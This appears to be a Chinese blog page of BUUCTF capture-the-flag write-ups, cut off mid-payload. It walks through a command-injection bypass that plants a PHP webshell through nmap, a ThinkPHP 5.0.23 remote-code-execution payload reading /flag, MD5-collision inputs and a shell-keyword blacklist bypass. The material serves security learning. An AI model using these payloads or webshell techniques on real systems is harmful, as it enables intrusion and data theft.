

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
  <link rel="icon" type="image/png" href="/img/feiji.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="sunzy">
  <meta name="keywords" content="">
  <title>buuctf-z7z8 - 一路走到黑</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-10-08 20:34" pubdate>
        2020年10月8日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      91
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">buuctf-z7z8</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：5 分钟前
                
              </p>
            
            <div class="markdown-body" id="post-body">
              <p>buuctf上的其他题型的集合，懒得分类了</p>
<h1 id="buuctf-z7z8"><a href="#buuctf-z7z8" class="headerlink" title="buuctf-z7z8"></a>buuctf-z7z8</h1><a id="more"></a>

<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;
  $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
&#125;

<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;
  highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
  $host = $_GET[<span class="hljs-string">'host'</span>];
  $host = escapeshellarg($host);
  $host = escapeshellcmd($host);
  $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);
  <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;
  @mkdir($sandbox); <span class="hljs-comment">//创建了路径</span>
  chdir($sandbox);
  <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);
&#125;</code></pre></div>

<p>前面的两段代码没啥用，主要是后面处理  <code>host</code>的过程</p>
<p><strong>1.知识储备</strong></p>
<blockquote>
<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p>
</blockquote>
<blockquote>
<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$<code>,</code>\x0A<code>和</code>\xFF<code>。</code>‘<code>和</code>“<code>仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及</code>%<code>和</code>!` 字符都会被空格代替。</p>
</blockquote>
<p><strong>namp命令</strong></p>
<blockquote>
<p><code>-T5</code> :扫描等级,越大越快,越快越不安全,最好设置为<code>-T4</code><br><code>-sT</code> :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试<br><code>-Pn</code> :禁用ping<br><code>-host-timeout 2</code>:设置扫描一台主机的时间，以毫秒为单位。<br><code>-F</code> :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p>
</blockquote>
<p><strong>漏洞点在这</strong></p>
<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
<p><strong>2.构造payload</strong></p>
<blockquote>
<ol>
<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code></li>
</ol>
</blockquote>
<p><strong>回到<code>mail</code>中，我们的 payload 最终在执行时变成了<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>，分割后就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，最终的参数就是这样被注入的。</strong></p>
<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">参考</a></p>
<p>需要绕过上面的两个函数，先试试两个函数的作用</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$host = <span class="hljs-string">" 1'shellcode "</span>;
$host = escapeshellarg($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;
$host = escapeshellcmd($host);
<span class="hljs-keyword">echo</span> $host;
<span class="hljs-meta">?&gt;</span>
<span class="hljs-string">' 1'</span>\<span class="hljs-string">''</span>shellcode <span class="hljs-string">'</span>
<span class="hljs-string">'</span> <span class="hljs-number">1</span><span class="hljs-string">'\\'</span><span class="hljs-string">'shellcode \'</span></code></pre></div>

<p>构造的一句话木马为：<code>&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39;</code></p>
<p>运行结果为：<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
<p>这里的单引号都是成对出现的，所以没影响</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xml">?host=' <span class="php"><span class="hljs-meta">&lt;?php</span> @shellcode<span class="hljs-meta">?&gt;</span></span> -oG hack.php '</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/1kHWE9zFn6L3XsB.png" srcset="/img/loading.gif" alt="online1.png"></p>
<p>上传文件的保存路径，利用蚁剑链接一下</p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
<p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
<p>(写的有点乱)</p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示</p>
<p><img src="https://i.loli.net/2020/10/24/e2hpjI7tioY3gN9.png" srcset="/img/loading.gif" alt="cve.png"></p>
<p>这里应该是php5的漏洞利用，和攻防世界的一道题比较像<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">传送门</a></p>
<p>先看看报错信息:1 <code>url+?s=1</code></p>
<p><img src="https://i.loli.net/2020/10/24/3H6YjEuRLQfGl28.png" srcset="/img/loading.gif" alt="cve-1.png"></p>
<p>php版本为5.0.23，上网搜了一下这版本的漏洞</p>
<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
<p>直接构造payload，读取目录</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=ls /</code></pre></div>

<p>看到了flag文件</p>
<p>读取flag</p>
<div class="hljs"><pre><code class="hljs dts">url
<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/VBW2Xg7yfmR4ciE.png" srcset="/img/loading.gif" alt="cve-3.png"></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><div class="hljs"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you
<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
$flag=<span class="hljs-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'gg'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>])) &#123;
	$id=$_GET[<span class="hljs-string">'id'</span>];
	$gg=$_GET[<span class="hljs-string">'gg'</span>];
	<span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'You got the first step'</span>;
		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;
			$passwd=$_POST[<span class="hljs-string">'passwd'</span>];
			<span class="hljs-keyword">if</span> (!is_numeric($passwd)) &#123;
				<span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>) &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">'Good Job!'</span>;
					highlight_file(<span class="hljs-string">'flag.php'</span>);
					<span class="hljs-keyword">die</span>(<span class="hljs-string">'By Retr_0'</span>);
				&#125; <span class="hljs-keyword">else</span> &#123;
					<span class="hljs-keyword">echo</span> <span class="hljs-string">"can you think twice??"</span>;
				&#125;
			&#125; <span class="hljs-keyword">else</span> &#123;
				<span class="hljs-keyword">echo</span> <span class="hljs-string">'You can not get it !'</span>;
			&#125;
		&#125; <span class="hljs-keyword">else</span> &#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'only one way to get the flag'</span>);
		&#125;
	&#125; <span class="hljs-keyword">else</span> &#123;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"You are not a real hacker!"</span>;
	&#125;
&#125; <span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Please input first'</span>);
&#125;
&#125;</code></pre></div>

<p>先F12找一找提示，原来就是格式化好的源码</p>
<div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-name">md5</span>($id) === md5($gg) <span class="hljs-symbol">&amp;&amp;</span> $id !== $gg)</code></pre></div>

<p>直接使用数组绕过，也可以使用md5强碰撞的两字符串</p>
<div class="hljs"><pre><code class="hljs llvm">param<span class="hljs-number">1</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span>
param<span class="hljs-number">2</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span></code></pre></div>

<p><code>if (!is_numeric($passwd))</code>弱类型比较，使用1234567a绕过</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%00</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1U</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>&amp;gg=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%02</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>

POST:passwd=<span class="hljs-number">1234567</span>a

或者
<span class="hljs-built_in">?id</span>[]=<span class="hljs-number">1</span>&amp;gg[]=<span class="hljs-number">2</span>

POST:passwd=<span class="hljs-number">1234567</span>a</code></pre></div>

<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url中包含<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>，仔细看<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>其实是base64编码，解码还是base64，继续解码为一串十六进制的字符，内容为555.png</p>
<p>通过<code>555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0</code>可以类型的构造出index.php查询代码</p>
<div class="hljs"><pre><code class="hljs angelscript">index.php

<span class="hljs-number">696e6465782</span>e706870

Njk2ZTY0NjU3ODJlNzA2ODcw

TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/vQ5dSRXbJZ6Yagn.png" srcset="/img/loading.gif" alt="web-4.png"></p>
<p><img src="https://i.loli.net/2020/10/24/ZfMW62Ik1L5adpz.png" srcset="/img/loading.gif" alt="web-1.png"></p>
<p>base64解码后</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL || ~ E_NOTICE);
header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);
$cmd = $_GET[<span class="hljs-string">'cmd'</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>])) 
    header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);
$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));

$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixiï½ no flag"</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    $txt = base64_encode(file_get_contents($file));
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>; <span class="hljs-comment">//将555.png的内容以base64形式显示</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125;
<span class="hljs-keyword">echo</span> $cmd;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123; <span class="hljs-comment">//cmd参数进行了过滤</span>
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;<span class="hljs-comment">// md5强碰撞</span>
        <span class="hljs-keyword">echo</span> `$cmd`;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);
    &#125;
&#125;

<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;style&gt;
  body&#123;
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:<span class="hljs-comment">#CCCCCC;</span>
&#125;
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));
<span class="hljs-comment">//这里将img的值两次base64解码后赋值给了file变量</span>
...
$txt = base64_encode(file_get_contents($file));<span class="hljs-comment">//这里存在file_get_contents()函数，直接读取文件的内容</span></code></pre></div>

<p>这题还对一些系统命令进行了过滤，这里需要想办法绕过</p>
<p>ls，不可以使用，但是dir没有过滤，可以使用<code>dir%20/</code>读取目录</p>
<p>cat被过滤了，但是可以使用<code>ca\t</code>绕过，<code>ca\t%20/flag</code></p>
<p><strong>(linux命令中可以加)</strong></p>
<div class="hljs"><pre><code class="hljs lisp">if ((<span class="hljs-name">string</span>)$_POST['a'] !== (<span class="hljs-name">string</span>)$_POST['b'] <span class="hljs-symbol">&amp;&amp;</span> md5($_POST['a']) === md5($_POST['b']))</code></pre></div>

<p>md5强碰撞的字符串</p>
<div class="hljs"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span 